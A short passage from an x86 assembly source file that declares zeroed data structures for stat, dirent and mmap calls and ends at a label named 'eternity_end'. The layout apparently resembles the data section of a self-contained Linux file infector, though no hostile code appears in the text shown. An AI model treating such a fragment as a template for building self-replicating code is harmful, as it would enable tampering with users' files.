		   dd             00000000h ; st_ctime
		   dd             00000000h ; __unused3
		   dd             00000000h ; __unused4
		   dd             00000000h ; __unused5


;--------------------------------------------------------------
; Source: /usr/include/bits/dirent.h
; struct dirent
;  {
;#ifndef __USE_FILE_OFFSET64
;    __ino_t d_ino;
;    __off_t d_off;
;#else
;    __ino64_t d_ino;
;    __off64_t d_off;
;#endif
;    unsigned short int d_reclen;
;    unsigned char d_type;
;    char d_name[256];           /* We must not include limits.h! */
;  };
;--------------------------------------------------------------

DirentStruct:
                   dd             00000000h ; d_ino
		   dd             00000000h ; d_off
		   dw                 0000h ; d_reclen
		   times 256 db         00h ; d_name[256]

MmapStruct:
                   dd             00000000h ; addr
                   dd             00000000h ; lenght
                   dd             00000003h ; prot: PROT_WRITE|PROT_READ 
                   dd             00000001h ; flags: MAP_PRIVATE
                   dd             00000000h ; file descriptor(fd)
                   dd             00000000h ; offset
testing            times 11 db           00h 		 
eternity_end: 


